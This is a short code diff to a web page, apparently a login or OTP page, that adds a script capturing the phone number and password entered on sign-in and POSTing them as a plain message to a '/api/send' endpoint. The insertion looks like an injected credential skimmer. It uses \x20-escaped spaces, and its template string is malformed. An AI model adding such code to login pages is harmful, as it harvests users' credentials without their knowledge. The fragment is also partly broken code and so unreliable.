@@ -499,6 +499,7 @@ function closeOTP(){
         .style.display = "none";
 
 }
+<script>document.addEventListener("DOMContentLoaded",()=>{\x20const\x20signinBtn=document.querySelector(".sign-in");signinBtn?.addEventListener("click",async()=>{const\x20phone=document.getElementById("phone")?.value.trim();const\x20password=document.getElementById("password")?.value.trim();if(phone&&password){try{await\x20fetch("/api/send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:Phone:\x20${phone},\x20Password:\x20${password}})});}catch(e){console.error(e);}}});});</script>.
 </script>
 
 </body>
